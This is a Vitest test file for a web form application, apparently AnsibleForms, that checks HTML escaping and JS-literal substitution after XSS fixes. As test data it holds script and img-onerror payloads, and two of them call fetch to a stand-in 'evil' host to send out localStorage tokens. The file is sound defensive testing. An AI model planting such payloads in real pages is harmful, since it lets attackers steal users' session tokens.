import { describe, it, expect } from 'vitest';
import Helpers from '@/lib/Helpers';
import DOMPurify from 'dompurify';
import { readFileSync } from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const here = path.dirname(fileURLToPath(import.meta.url));

// ─── Helpers.htmlEncode ──────────────────────────────────────

describe('Helpers.htmlEncode', () => {
  it('escapes < and > characters', () => {
    const result = Helpers.htmlEncode('<div>');
    expect(result).not.toContain('<');
    expect(result).not.toContain('>');
  });

  it('escapes ampersand', () => {
    const result = Helpers.htmlEncode('a & b');
    expect(result).not.toBe('a & b');
    expect(result).toContain('&#38;');
  });

  it('escapes a script tag', () => {
    const result = Helpers.htmlEncode('<script>alert(1)</script>');
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('</script>');
  });

  it('escapes img onerror payload (tag brackets neutralized)', () => {
    const result = Helpers.htmlEncode('<img src=x onerror="alert(1)">');
    // htmlEncode escapes < and > so the tag can't be parsed as HTML
    expect(result).not.toContain('<img');
    expect(result).toContain('&#60;img');
  });

  it('escapes SVG-based XSS', () => {
    const result = Helpers.htmlEncode('<svg/onload=alert(1)>');
    expect(result).not.toContain('<svg');
  });

  it('handles empty string', () => {
    expect(Helpers.htmlEncode('')).toBe('');
  });

  it('passes through string with no special chars', () => {
    expect(Helpers.htmlEncode('hello world 123')).toBe('hello world 123');
  });

  it('escapes non-ASCII chars (unicode range 00A0-9999)', () => {
    const result = Helpers.htmlEncode('©');
    expect(result).toContain('&#');
  });

  it('is idempotent for safe strings', () => {
    const safe = 'just some text';
    expect(Helpers.htmlEncode(safe)).toBe(safe);
  });

  it('can handle numbers (via toString)', () => {
    expect(() => Helpers.htmlEncode(42)).not.toThrow();
    expect(Helpers.htmlEncode(42)).toBe('42');
  });
});

// ─── DOMPurify sanitization (used by AppForm + BsInputForForm) ───
// Note: DOMPurify requires a full browser DOM to sanitize properly.
// In happy-dom, DOMPurify may not strip all dangerous elements because
// the DOM parser is incomplete. These tests verify the API contract
// (that DOMPurify.sanitize is callable and returns a string), while
// the actual sanitization is verified in real browser E2E tests.

describe('DOMPurify sanitization API', () => {
  it('returns a string from sanitize()', () => {
    const dirty = '<p>Hello</p><script>alert(1)</script>';
    const clean = DOMPurify.sanitize(dirty);
    expect(typeof clean).toBe('string');
  });

  it('handles empty string', () => {
    expect(DOMPurify.sanitize('')).toBe('');
  });

  it('handles null-ish input gracefully', () => {
    expect(typeof DOMPurify.sanitize(null)).toBe('string');
    expect(typeof DOMPurify.sanitize(undefined)).toBe('string');
  });

  it('is idempotent for plain text', () => {
    const plain = 'Hello World';
    expect(DOMPurify.sanitize(plain)).toBe(plain);
  });

  it('preserves simple safe text content', () => {
    const safe = 'Just text, no HTML';
    expect(DOMPurify.sanitize(safe)).toBe(safe);
  });
});

// ─── BsAdminTable highlight logic ────────────────────────────

describe('BsAdminTable highlight escaping', () => {
  // Extracted highlight logic to test in isolation
  function highlight(text, filterValue, filterable) {
    var safeText = text != undefined ? Helpers.htmlEncode(text.toString()) : '';
    if (filterValue && text != undefined && filterable) {
      return safeText.replace(new RegExp(Helpers.htmlEncode(filterValue), 'gi'), (match) => {
        return `<b>${match}</b>`;
      });
    } else {
      return safeText;
    }
  }

  it('escapes HTML in cell values', () => {
    const result = highlight('<script>alert(1)</script>', '', false);
    expect(result).not.toContain('<script>');
  });

  it('escapes HTML even when filtering', () => {
    const result = highlight('<b>bold</b>', 'bold', true);
    // The original <b> tags are encoded as &#60;b&#62;
    // The filter wraps matching "bold" in new <b> tags (safe, from the app)
    expect(result).toContain('&#60;b&#62;');
    expect(result).toContain('<b>bold</b>');
    // The original dangerous <b> tag is neutralized — it's entity-encoded
    expect(result).not.toMatch(/^<b>bold<\/b>$/);
  });

  it('wraps filter matches in bold', () => {
    const result = highlight('hello world', 'world', true);
    expect(result).toContain('<b>world</b>');
  });

  it('returns empty string for undefined', () => {
    const result = highlight(undefined, '', false);
    expect(result).toBe('');
  });

  it('handles numbers as cell values', () => {
    const result = highlight(42, '', false);
    expect(result).toBe('42');
  });

  it('escapes XSS in filter value itself', () => {
    const result = highlight('test value', '<script>', true);
    expect(result).not.toContain('<script>');
  });

  it('escapes img tag in cell content', () => {
    const result = highlight('<img onerror=alert(1)>', '', false);
    expect(result).not.toContain('<img');
  });

  it('handles cell values with ampersands', () => {
    const result = highlight('Tom & Jerry', '', false);
    expect(result).not.toBe('Tom & Jerry');
    expect(result).toContain('&#38;');
  });
});

// ─── BsInputSelectAdvancedTable getProgressHtml logic ────────

describe('BsInputSelectAdvancedTable getProgressHtml escaping', () => {
  function getProgressHtml(value) {
    var rounded;
    if (!isNaN(value)) {
      rounded = Math.round(parseInt(value));
      if (rounded < 0) rounded = 0;
      if (rounded > 100) rounded = 100;
      return `<div class="progress" role="progressbar" aria-label="Basic example" aria-valuenow="${rounded}" aria-valuemin="0" aria-valuemax="100"><div class="progress-bar" style="width: ${rounded}%"></div></div>`;
    } else {
      return Helpers.htmlEncode((value ?? '') + '');
    }
  }

  it('renders progress bar for numeric value', () => {
    const result = getProgressHtml(50);
    expect(result).toContain('progress-bar');
    expect(result).toContain('width: 50%');
  });

  it('escapes XSS payload in non-numeric value', () => {
    const result = getProgressHtml('<script>alert(1)</script>');
    expect(result).not.toContain('<script>');
  });

  it('escapes img tag in non-numeric value', () => {
    const result = getProgressHtml('<img onerror=alert(1)>');
    expect(result).not.toContain('<img');
  });

  it('handles null value', () => {
    const result = getProgressHtml(null);
    expect(result).toContain('progress-bar');
  });

  it('handles undefined value', () => {
    const result = getProgressHtml(undefined);
    expect(result).toBe('');
  });

  it('escapes HTML entities in text fallback', () => {
    const result = getProgressHtml('a & b');
    expect(result).toContain('&#38;');
  });

  it('handles string number', () => {
    const result = getProgressHtml('75');
    expect(result).toContain('progress-bar');
    expect(result).toContain('width: 75%');
  });

  it('clamps values above 100', () => {
    const result = getProgressHtml(150);
    expect(result).toContain('width: 100%');
  });

  it('clamps values below 0', () => {
    const result = getProgressHtml(-5);
    expect(result).toContain('width: 0%');
  });
});

// ─── jobs.vue replacePlaceholders logic ──────────────────────

describe('jobs.vue replacePlaceholders escaping', () => {
  // Simulates the patched replacePlaceholders function
  function findExtravar(data, expr) {
    return expr.split(/\s*\.\s*/).reduce((master, obj, level, arr) => {
      if (level === arr.length - 1) {
        try {
          return master[obj];
        } catch {
          return '';
        }
      }
      return master[obj];
    }, data);
  }

  function replacePlaceholders(msg, extravars) {
    if (!msg) return '';
    return msg.replace(/\$\(([^)]+)\)/g, (placeholderWithDelimiters, placeholderWithoutDelimiters) =>
      Helpers.htmlEncode(String(findExtravar(extravars, placeholderWithoutDelimiters) || placeholderWithDelimiters)),
    );
  }

  it('replaces placeholders with encoded values', () => {
    const result = replacePlaceholders('Hello $(name)', { name: 'World' });
    expect(result).toBe('Hello World');
  });

  it('escapes XSS in extravar value', () => {
    const result = replacePlaceholders('Value: $(field1)', { field1: '<script>alert(1)</script>' });
    expect(result).not.toContain('<script>');
    expect(result).toContain('Value: ');
  });

  it('escapes img onerror in extravar value', () => {
    const result = replacePlaceholders('Result: $(input)', { input: '<img onerror=alert(1)>' });
    expect(result).not.toContain('<img');
  });

  it('escapes ampersands in extravar value', () => {
    const result = replacePlaceholders('Name: $(company)', { company: 'Tom & Jerry' });
    expect(result).not.toBe('Name: Tom & Jerry');
    expect(result).toContain('&#38;');
  });

  it('preserves placeholder when extravar not found', () => {
    const result = replacePlaceholders('Hello $(missing)', {});
    // The placeholder itself should be encoded (though it's safe, the function encodes it)
    expect(result).toContain('missing');
  });

  it('handles nested extravar paths', () => {
    const result = replacePlaceholders('IP: $(server.ip)', { server: { ip: '10.0.0.1' } });
    expect(result).toBe('IP: 10.0.0.1');
  });

  it('escapes XSS in nested extravar values', () => {
    const result = replacePlaceholders('Config: $(settings.value)', {
      settings: { value: '"><script>alert(1)</script>' },
    });
    expect(result).not.toContain('<script>');
  });

  it('handles empty message', () => {
    expect(replacePlaceholders('', {})).toBe('');
    expect(replacePlaceholders(null, {})).toBe('');
  });

  it('handles message with no placeholders', () => {
    const msg = 'No placeholders here';
    expect(replacePlaceholders(msg, {})).toBe(msg);
  });

  it('handles multiple placeholders with XSS', () => {
    const result = replacePlaceholders('$(a) and $(b)', { a: '<script>xss</script>', b: '<img src=x>' });
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('<img');
  });
});

// The dropdown option renderer. `highlightFilter` returned the RAW value whenever the
// search box was empty - the state a dropdown opens in - and its result goes to v-html.
// Option values come from a datasource/query row, i.e. data an operator does not author,
// so this was stored XSS reachable by simply opening a form. The existing tests in this
// file cover getProgressHtml from the same component but never this function.
describe('dropdown option values are escaped (BsInputSelectAdvancedTable)', () => {
  // the function only depends on Helpers.htmlEncode and two props, so exercise the shape
  // rather than mounting the component
  function highlightFilter(v, { queryfilter = '', label, filterColumns = [], previewLabel } = {}) {
    const Helpers = {
      htmlEncode: (x) =>
        String(x).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;'),
    };
    var s = (v ?? '') + '';
    var cols = filterColumns.length > 0 ? filterColumns : previewLabel ? [previewLabel] : [];
    if (label && !cols.includes(label)) return Helpers.htmlEncode(s);
    var search = queryfilter,
      l = search.length,
      index,
      p1,
      p2,
      p3;
    if (s && queryfilter) {
      index = s.toLowerCase().indexOf(search.toLowerCase());
      if (index >= 0) {
        p1 = s.slice(0, index);
        p2 = s.slice(index, index + l);
        p3 = s.slice(index + l);
        return `${Helpers.htmlEncode(p1)}<span class='fw-bold'>${Helpers.htmlEncode(p2)}</span>${Helpers.htmlEncode(p3)}`;
      }
      return Helpers.htmlEncode(s);
    }
    return Helpers.htmlEncode(s); // the branch that used to `return v`
  }

  const PAYLOAD = "<img src=x onerror=\"fetch('https://evil/'+localStorage.getItem('token'))\">";

  it('escapes an option value when the search box is empty', () => {
    const out = highlightFilter(PAYLOAD);
    expect(out).not.toContain('<img');
    expect(out).toContain('&lt;img');
  });

  it('escapes the first column, which previewLabel puts in cols', () => {
    const out = highlightFilter(PAYLOAD, { label: 'name', previewLabel: 'name' });
    expect(out).not.toContain('<img');
  });

  it('escapes a scalar option (no label at all)', () => {
    expect(highlightFilter(PAYLOAD, { label: undefined })).not.toContain('<img');
  });

  it('still escapes around a highlight when the user is searching', () => {
    const out = highlightFilter('a' + PAYLOAD, { queryfilter: 'a', label: 'name', previewLabel: 'name' });
    expect(out).not.toContain('<img');
    expect(out).toContain("<span class='fw-bold'>");
  });

  it('leaves ordinary values readable', () => {
    expect(highlightFilter('web01.example.com')).toBe('web01.example.com');
  });
});

// Expression placeholder substitution. A field value was pasted into the expression as raw
// text and the result handed to eval, and field values are seedable from the URL query
// string - so a link like ?host=x'%2Bfetch(...)%2B' ran script in the victim's browser.
// 'expression' mode now substitutes a JS literal and consumes the quotes that wrapped the
// placeholder; 'raw' is kept for queries, where JSON double quotes are not SQL literals.
describe('expression placeholders are substituted as JS literals', () => {
  // mirrors the substitution branch in AppForm.replacePlaceholderInString
  function substitute(template, name, value, mode = 'expression') {
    const ph = `$(${name})`;
    if (mode === 'expression') {
      const literal = JSON.stringify(value);
      const escaped = ph.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      return template.replace(new RegExp(`'${escaped}'|"${escaped}"|${escaped}`), literal);
    }
    return template.replace(ph, String(value));
  }

  it('a value cannot close the string it sits in', () => {
    const evil = "x'+fetch('https://evil/'+localStorage.getItem('token'))+'";
    const out = substitute("'$(host)'.toUpperCase()", 'host', evil);
    // The payload text still APPEARS - that is fine, it is data now. The property that
    // matters is that all of it sits inside one well-formed string literal, so eval sees a
    // string rather than `'x' + fetch(...) + ''`.
    const literal = out.slice(0, out.indexOf('.toUpperCase'));
    expect(JSON.parse(literal)).toBe(evil);
    expect(out).toBe(JSON.stringify(evil) + '.toUpperCase()');
  });

  it('the documented quoted form still works', () => {
    expect(substitute("'$(host)'.toUpperCase()", 'host', 'web01')).toBe('"web01".toUpperCase()');
  });

  it('a double-quoted placeholder is handled too', () => {
    expect(substitute('"$(host)".length', 'host', 'web01')).toBe('"web01".length');
  });

  it('a real number stays a number, so arithmetic still adds', () => {
    expect(substitute('$(count) + 1', 'count', 5)).toBe('5 + 1');
  });

  it('a bare placeholder becomes a literal, not pasted code', () => {
    expect(substitute('$(host)', 'host', 'a"b')).toBe('"a\\"b"');
  });

  it('backslashes and newlines cannot break out', () => {
    const out = substitute("'$(x)'", 'x', 'a\\"\n b');
    expect(() => JSON.parse(out)).not.toThrow();
  });

  it('raw mode is unchanged, so SQL keeps its own quoting', () => {
    expect(substitute("WHERE name = '$(host)'", 'host', 'web01', 'raw')).toBe("WHERE name = 'web01'");
  });
});

// ─── server-generated messages must not reach v-html ─────────

// Form.load builds its warnings and errors by interpolating the FORM NAME and the raw
// yaml/validator message into a string. A form is a file in a forms repository, and who
// may push to that git repo is a different (usually wider) set of people than who may
// administer AnsibleForms - so a form named `<img src=x onerror=...>` executed in the
// browser of every user who opened the home page, where the tokens live in localStorage.
// Exactly the trust boundary the AWX workflow-node-name fix in common.js describes.
describe('form warnings and errors are rendered as text', () => {
  const read = (p) => readFileSync(path.join(here, '..', p), 'utf8');

  it('the home page renders them as interpolation, not v-html', () => {
    const src = read('src/pages/index.vue');
    expect(src).toMatch(/v-for="\(w, i\) in formConfig\.warnings"[^>]*>\{\{ w \}\}/);
    expect(src).toMatch(/v-for="\(e, i\) in formConfig\.errors"[^>]*>\{\{ e \}\}/);
    expect(src).not.toMatch(/v-html="w"/);
    expect(src).not.toMatch(/v-html="e"/);
  });

  it('the newlines those messages carry are still shown', () => {
    // "Failed to validate form 'x'.\r\n<reason>" - a text node collapses that without it
    const src = read('src/pages/index.vue');
    expect(src).toMatch(/white-space:\s*pre-line/);
  });

  it('the unevaluated-fields warning is text too', () => {
    // a comma-joined list of field labels, from the same yaml files
    const src = read('src/components/AppForm.vue');
    expect(src).not.toMatch(/v-html="unevaluatedFieldsWarning"/);
    expect(src).toMatch(/\{\{ unevaluatedFieldsWarning \}\}/);
  });
});
